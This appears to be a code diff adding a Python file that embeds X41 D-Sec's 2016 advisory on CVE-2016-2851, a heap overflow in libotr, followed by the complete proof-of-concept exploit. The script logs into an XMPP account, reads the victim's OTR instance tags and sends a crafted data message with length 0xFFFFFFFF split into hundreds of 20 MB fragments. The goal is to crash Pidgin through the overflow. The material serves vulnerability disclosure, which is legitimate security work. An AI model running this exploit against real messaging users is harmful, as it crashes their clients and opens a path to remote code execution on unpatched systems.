@@ -1,0 +1,554 @@
+'''
+X41 D-Sec GmbH Security Advisory: X41-2016-001
+
+Memory Corruption Vulnerability in "libotr"
+===========================================
+
+Overview
+--------
+Severity Rating: high
+Confirmed Affected Version: 4.1.0 and below
+Confirmed Patched Version: libotr 4.1.1
+Vendor: OTR Development Team
+Vendor URL: https://otr.cypherpunks.ca
+Vendor Reference: OTR Security Advisory 2016-01
+Vector: Remote
+Credit: X41 D-Sec GmbH, Markus Vervier
+Status: public
+CVE: CVE-2016-2851
+CVSS Score: 8.1 (High)
+CVSS Vector: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+Advisory-URL: https://www.x41-dsec.de/lab/advisories/x41-2016-001-libotr/
+
+Summary and Impact
+------------------
+A remote attacker may crash or execute arbitrary code in libotr by
+sending large OTR messages.
+While processing specially crafted messages, attacker controlled data on
+the heap is written out of bounds.
+No special user interaction or authorization is necessary in default
+configurations.
+
+Product Description
+-------------------
+Off-the-Record (OTR) Messaging is a cryptographic protocol used in
+well-known instant messaging clients such as Pidgin, ChatSecure, Adium
+and others. It is designed to work on top of existing protocols and used
+worldwide to provide secure communication in insecure environments.
+OTR is regarded as highly secure and according to documents revealed by
+Edward Snowden one of the protocols that the NSA is not able to decrypt
+via cryptanalysis.
+The most commonly used implementation of OTR is "libotr" which is a pure
+C code implementation of the OTR protocol.
+
+Analysis
+--------
+During a manual code review X41 D-Sec GmbH discovered a remotely
+exploitable vulnerability in libotr.
+
+By sending large messages, an integer overflow can be triggered which
+subsequently leads to a heap overflow on 64 bit architectures.
+
+When a message of type OTRL_MSGSTATE_DATA is received during an
+established OTR conversation, this message is passed to function
+otrl_proto_accept_data in src/message.c line 1347:
+
+	case OTRL_MSGSTATE_ENCRYPTED:
+		extrakey = gcry_malloc_secure(OTRL_EXTRAKEY_BYTES);
+		err = otrl_proto_accept_data(&plaintext, &tlvs, context,
+		                  message, &flags, extrakey);
+
+After base64 decoding the message and reading various values from it,
+the length of a payload is read into a variable of type "unsigned int"
+in file proto.c line 784:
+
+	read_int(datalen);
+
+It is checked that the message buffer will contain at least a "datalen"
+number of bytes using read_int in proto.c line 785:
+
+	require_len(datalen);
+
+The macros "read_int" and "required_len" are defined in src/serial.h:
+
+	#define require_len(l) do { \
+		if (lenp < (l)) goto invval; \
+	    } while(0)
+
+	#define read_int(x) do { \
+		require_len(4); \
+		(x) = (((unsigned int)bufp[0]) << 24) | (bufp[1] << 16) | (bufp[2] <<
+8) | bufp[3]; \
+		bufp += 4; lenp -= 4; \
+	    } while(0)
+
+4 bytes are read from the message buffer and interpreted as unsigned int
+value.
+
+Subsequently a buffer of size datalen+1 is allocated using malloc
+in proto.c line 786:
+
+    data = malloc(datalen+1);
+    if (!data) {
+        err = gcry_error(GPG_ERR_ENOMEM);
+        goto err;
+    }
+
+Now data from the message is copied into this buffer using memmove in
+line 791:
+
+    memmove(data, bufp, datalen);
+
+The vulnerability is triggered if a value of 0xFFFFFFFF (MAX_UINT) is
+read from the message buffer. As datalen is of size 32-bit (unsigned
+int) the operation "datalen+1" will wrap around before being passed to
+malloc.
+This will effectively result in a zero allocation ( malloc(0) ) which is
+valid in common implementations of malloc on the x86_64 architecture.
+As no addition is done in the value passed to the call to memmove, 4
+gigabytes of data are copied out of bounds to the heap location pointed
+to by data.
+
+Proof of Concept
+----------------
+In order to successfully trigger the vulnerability, an attacker must be
+able to send a data message of more than 5.5 gigabytes to a victim in
+order to pass the check "require_len(datalen)".
+Due to the support of fragmented OTR messages assembled by libotr this
+is possible in practice. By sending 275 messages of size 20MB each, X41
+was able to make libotr process such a data message successfully on a
+system with 8GB of ram and 15GB of swap space.
+As data types for lenp and other lengths of the message are 64 bit large
+size_t types on x86_64 architectures huge messages of multiple gigabytes
+are possible.
+Sending such a message to a pidgin client took only a few minutes on a
+fast network connection without visible signs of any attack to a user.
+
+A proof of concept triggering a heap overwrite and crash in the
+pidgin-otr plugin for the popular pidgin messenger on x86_64 Linux
+architectures is available[1].
+
+The crash occurs due to the overwrite hitting unmapped memory. Using
+techniques such as heap grooming, X41 was able to inflate the heap to
+more than 4GB and overwrite function pointers and arguments on the heap
+in order to take over control flow. A working exploit will not be
+published at this time.
+
+Interaction by users beyond having enabled OTR is not necessary as OTR
+sessions are automatically established with anyone by default in Pidgin
+and other common software using libotr. This also applies to
+unauthorized contacts in most default configurations.
+
+Workarounds
+-----------
+As a temporary workaround on Linux and BSD systems, the amount of memory
+available to the process running libotr may be limited to less than 4GB
+via ulimit.
+
+About X41 D-Sec GmbH
+--------------------
+X41 D-Sec is a provider of application security services. We focus
+on application code reviews, design review and security testing. X41
+D-Sec GmbH was founded in 2015 by Markus Vervier. We support customers
+in various industries such as finance, software development and public
+institutions.
+
+Timeline
+--------
+2016-02-17	Discovery during a manual code review of "libotr" version 4.1.0
+2016-02-17	Initial PoC
+2016-02-18	Vendor contacted
+2016-02-18	Vulnerability confirmed by vendor
+2016-03-03	Vendor patch available
+2016-03-04	CVE requested
+2016-03-06	CVE-2016-2851 assigned
+2016-03-09	Embargo lifted and disclosure
+
+References
+----------
+[1]
+https://www.x41-dsec.de/lab/advisories/x41-2016-001-libotr/otr-heap-overwrite-poc.py
+'''
+
+#!/usr/bin/python -u
+#
+### PoC libotr heap overwrite on Pidgin
+### 2016-02-17 Markus Vervier
+### X41 D-Sec GmbH
+
+### initial code taken from pyxmpp examples (echobot.py)
+
+### PoC was tested using a standard Prosody XMPP-Server on Arch-Linux allowing 20MB sized messages by default (and even larger)
+
+### On a loopback interface the exploit took several minutes,
+### using XMPP stream compression this could be reduced massively
+
+### pyxmpp does not support it
+### We used XMPP connections without TLS to not further complicate the setup
+
+### USAGE
+### 
+### Prerequisite: 2 Jabber Accounts (attacker, victim), set Ressource of attacker to "attacktest"
+
+### 1. Initiate an encrypted session from attacker-account to victim-account (e.g. using pidgin)
+### 2. Disconnect the attacker account
+### 3. Fire up this script and let it connect with the attacker account credentials
+### 4. Send a message from victim to attacker
+### 5. Wait until message sending is complete, pidgin should crash
+
+### !!! Steps 2-5 (and especially user interaction) are only necessary for this PoC
+### !!! If we would implement full OTR in this script we could send the bad message directly
+### !!! For easier PoC we now wait until an encrypted message is received to get the correct instance tags
+
+import sys
+import logging
+import locale
+import codecs
+import os, signal
+import time
+import base64
+
+def ignore_signal_pipe(signum, frame):
+    print 'signal pipe caught -- IGNORING'
+
+signal.signal(signal.SIGPIPE, ignore_signal_pipe)
+
+from struct import *
+from pyxmpp.all import JID,Iq,Presence,Message,StreamError
+from pyxmpp.jabber.client import JabberClient
+from pyxmpp.interface import implements
+from pyxmpp.interfaces import *
+from pyxmpp.streamtls import TLSSettings
+from enum import Enum
+
+class EchoHandler(object):
+    """Provides the actual 'echo' functionality.
+
+    Handlers for presence and message stanzas are implemented here.
+    """
+
+    implements(IMessageHandlersProvider, IPresenceHandlersProvider)
+    
+    def __init__(self, client):
+        """Just remember who created this."""
+        self.client = client
+
+    def get_message_handlers(self):
+        """Return list of (message_type, message_handler) tuples.
+
+        The handlers returned will be called when matching message is received
+        in a client session."""
+        return [
+            ("normal", self.message),
+            ]
+
+    def get_presence_handlers(self):
+        """Return list of (presence_type, presence_handler) tuples.
+
+        The handlers returned will be called when matching presence stanza is
+        received in a client session."""
+        return [
+            (None, self.presence),
+            ("unavailable", self.presence),
+            ("subscribe", self.presence_control),
+            ("subscribed", self.presence_control),
+            ("unsubscribe", self.presence_control),
+            ("unsubscribed", self.presence_control),
+            ]
+
+    def message(self,stanza):
+        """Message handler for the component.
+
+        Echoes the message back if its type is not 'error' or
+        'headline', also sets own presence status to the message body. Please
+        note that all message types but 'error' will be passed to the handler
+        for 'normal' message unless some dedicated handler process them.
+
+        :returns: `True` to indicate, that the stanza should not be processed
+        any further."""
+        subject=stanza.get_subject()
+        body=stanza.get_body()
+        t=stanza.get_type()
+        m = 0 
+        print u'Message from %s received.' % (unicode(stanza.get_from(),)),
+        if subject:
+            print u'Subject: "%s".' % (subject,),
+        if body:
+            print u'Body: "%s".' % (body,),
+        if t:
+            print u'Type: "%s".' % (t,)
+        else:
+            print u'Type: "normal".'
+        if stanza.get_type()=="headline":
+            # 'headline' messages should never be replied to
+            return True
+        # record instance tag
+        if body[:9] == u'?OTR:AAMD':
+            (self.instance_tag, self.our_tag) = self.parse_aamc(body[len("?OTR:AAMD"):])
+            print "parsed instance tag: %s and our tag %s" % (self.instance_tag.encode("hex"), self.our_tag.encode("hex") )
+            self.send_insane_otr(stanza, 1024*1024*20, self.instance_tag, self.our_tag)
+        
+        return m
+
+    def b64maxlen(self, chars):
+        return 1 + (4 * chars / 3)
+
+    def parse_aamc(self, msg):
+        maxlen = self.b64maxlen(8) # 4 byte integer
+        print "maxlen %u" % (maxlen)
+        tmp = msg[0:maxlen]
+        padding = ""
+        if maxlen % 4 > 1:
+            padding = "="*(4-(maxlen % 4))
+        tmp += padding
+        print "decoding: "+tmp
+        packed = base64.b64decode(tmp)
+#        return unpack("I", packed[0:4])
+        return (packed[0:4], packed[4:8]) # their tag, our tag
+
+    def initial_body(self, instance_tag, our_tag):
+        ret = "?OTR:AAMD";
+        raw = b''
+        print "packing initial block with instance tag: %s and our tag: %s" % (instance_tag.encode("hex"), our_tag.encode("hex"))
+        #dirty hack
+        raw += our_tag # sender_nstance_id
+        raw += instance_tag # receiver_id
+        raw += "D" # dummy flags
+        raw += pack("I", 0x1) # sender key id
+        raw += pack("I", 0x2) # recipient key id
+        raw += pack("!I", 10) # len next_y
+	raw += "B"*10 # next_y # we don't know how mpi works but it seems ok ;)
+        raw += "12345678" # reveal sig dummy
+        # yeah overflow!
+        raw += pack("I", 0xFFFFFFFF); # datalen
+
+        ret += base64.b64encode(raw+"A"*(57-len(raw)))
+        return ret
+
+    def send_insane_otr(self, stanza, frag_size, instance_tag, our_tag):
+        print "G-FUNK!"
+
+        # this should result in about 0xFFFFFFFF times "A" base64 encoded        
+        len_msg = 5726623060
+        # fix frag size for base64
+        frag_size = (frag_size / 4) * 4
+
+        frag_msg = "QUFB"*(frag_size / 4)
+
+        n = len_msg / frag_size 
+        # does not evenly divide?
+        if len_msg % frag_size > 0:
+            n += 1
+        k = 1
+        n += 1 # initialbody adds another frame
+        initialbody = "?OTR,%hu,%hu,%s," % (k , n , self.initial_body(instance_tag, our_tag))
+        print "first fragment: "+initialbody
+        m = Message(
+                to_jid=stanza.get_from(),
+                from_jid=stanza.get_to(),
+                stanza_type=stanza.get_type(),
+                subject="foo",
+                body=initialbody)
+        self.client.stream.send(m)
+        k += 1
+        print "frag size: %s, len_msg: %u, num_frags: %u" % (frag_size, len_msg, n)
+        cur_pos = 0
+        while(cur_pos < len_msg):
+            body = "?OTR,%hu,%hu,%s," % (k , n , frag_msg)
+            m = Message(
+                to_jid=stanza.get_from(),
+                from_jid=stanza.get_to(),
+                stanza_type=stanza.get_type(),
+                subject="foo",
+                body=body)
+            print "cur_pos %u of %u" % (cur_pos, len_msg)
+            self.client.stream.send(m)
+            k += 1
+            cur_pos = frag_size * (k-2)
+            time.sleep(0.9)
+        print "FINAL FRAG: cur_pos %u of %u" % (cur_pos, len_msg)
+
+ 
+    def presence(self,stanza):
+        """Handle 'available' (without 'type') and 'unavailable' <presence/>."""
+        msg=u"%s has become " % (stanza.get_from())
+        t=stanza.get_type()
+        if t=="unavailable":
+            msg+=u"unavailable"
+        else:
+            msg+=u"available"
+
+        show=stanza.get_show()
+        if show:
+            msg+=u"(%s)" % (show,)
+
+        status=stanza.get_status()
+        if status:
+            msg+=u": "+status
+        print msg
+
+    def presence_control(self,stanza):
+        """Handle subscription control <presence/> stanzas -- acknowledge
+        them."""
+        msg=unicode(stanza.get_from())
+        t=stanza.get_type()
+        if t=="subscribe":
+            msg+=u" has requested presence subscription."
+        elif t=="subscribed":
+            msg+=u" has accepted our presence subscription request."
+        elif t=="unsubscribe":
+            msg+=u" has canceled his subscription of our."
+        elif t=="unsubscribed":
+            msg+=u" has canceled our subscription of his presence."
+
+        print msg
+
+        return stanza.make_accept_response()
+
+
+class VersionHandler(object):
+    """Provides handler for a version query.
+    
+    This class will answer version query and announce 'jabber:iq:version' namespace
+    in the client's disco#info results."""
+    
+    implements(IIqHandlersProvider, IFeaturesProvider)
+
+    def __init__(self, client):
+        """Just remember who created this."""
+        self.client = client
+
+    def get_features(self):
+        """Return namespace which should the client include in its reply to a
+        disco#info query."""
+        return ["jabber:iq:version"]
+
+    def get_iq_get_handlers(self):
+        """Return list of tuples (element_name, namespace, handler) describing
+        handlers of <iq type='get'/> stanzas"""
+        return [
+            ("query", "jabber:iq:version", self.get_version),
+            ]
+
+    def get_iq_set_handlers(self):
+        """Return empty list, as this class provides no <iq type='set'/> stanza handler."""
+        return []
+
+    def get_version(self,iq):
+        """Handler for jabber:iq:version queries.
+
+        jabber:iq:version queries are not supported directly by PyXMPP, so the
+        XML node is accessed directly through the libxml2 API.  This should be
+        used very carefully!"""
+        iq=iq.make_result_response()
+        q=iq.new_query("jabber:iq:version")
+        q.newTextChild(q.ns(),"name","Echo component")
+        q.newTextChild(q.ns(),"version","1.0")
+        return iq
+
+class Client(JabberClient):
+    """Simple bot (client) example. Uses `pyxmpp.jabber.client.JabberClient`
+    class as base. That class provides basic stream setup (including
+    authentication) and Service Discovery server. It also does server address
+    and port discovery based on the JID provided."""
+
+    def __init__(self, jid, password, tls_cacerts):
+        # if bare JID is provided add a resource -- it is required
+        if not jid.resource:
+            jid=JID(jid.node, jid.domain, "attacktest")
+
+        if tls_cacerts:
+            if tls_cacerts == 'tls_noverify':
+                tls_settings = TLSSettings(require = True, verify_peer = False)
+            else:
+                tls_settings = TLSSettings(require = True, cacert_file = tls_cacerts)
+        else:
+            tls_settings = None
+
+        # setup client with provided connection information
+        # and identity data
+        JabberClient.__init__(self, jid, password,
+                disco_name="PyXMPP example: echo bot", disco_type="bot",
+                tls_settings = tls_settings)
+
+        # add the separate components
+        self.interface_providers = [
+            VersionHandler(self),
+            EchoHandler(self),
+            ]
+
+    def stream_state_changed(self,state,arg):
+        """This one is called when the state of stream connecting the component
+        to a server changes. This will usually be used to let the user
+        know what is going on."""
+        print "*** State changed: %s %r ***" % (state,arg)
+
+    def print_roster_item(self,item):
+        if item.name:
+            name=item.name
+        else:
+            name=u""
+        print (u'%s "%s" subscription=%s groups=%s'
+                % (unicode(item.jid), name, item.subscription,
+                    u",".join(item.groups)) )
+
+    def roster_updated(self,item=None):
+        if not item:
+            print u"My roster:"
+            for item in self.roster.get_items():
+                self.print_roster_item(item)
+            return
+        print u"Roster item updated:"
+        self.print_roster_item(item)
+
+# XMPP protocol is Unicode-based to properly display data received
+# _must_ convert it to local encoding or UnicodeException may be raised
+locale.setlocale(locale.LC_CTYPE, "")
+encoding = locale.getlocale()[1]
+if not encoding:
+    encoding = "us-ascii"
+sys.stdout = codecs.getwriter(encoding)(sys.stdout, errors = "replace")
+sys.stderr = codecs.getwriter(encoding)(sys.stderr, errors = "replace")
+
+
+# PyXMPP uses `logging` module for its debug output
+# applications should set it up as needed
+logger = logging.getLogger()
+logger.addHandler(logging.StreamHandler())
+logger.setLevel(logging.INFO) # change to DEBUG for higher verbosity
+
+if len(sys.argv) < 3:
+    print u"Usage:"
+    print "\t%s JID password ['tls_noverify'|cacert_file]" % (sys.argv[0],)
+    print "example:"
+    print "\t%s test@localhost verysecret" % (sys.argv[0],)
+    sys.exit(1)
+
+print u"creating client..."
+
+c=Client(JID(sys.argv[1]), sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else None)
+
+print u"connecting..."
+c.connect()
+
+print u"looping..."
+try:
+    # Component class provides basic "main loop" for the applitation
+    # Though, most applications would need to have their own loop and call
+    # component.stream.loop_iter() from it whenever an event on
+    # component.stream.fileno() occurs.
+    c.loop(1)
+except IOError, e:
+    if e.errno == errno.EPIPE:
+    # IGNORE EPIPE error
+        print "PIPE ERROR -- IGNORING"
+    else:
+        pass
+
+
+except KeyboardInterrupt:
+    print u"disconnecting..."
+    c.disconnect()
+
+print u"exiting..."
+# vi: sts=4 et sw=4
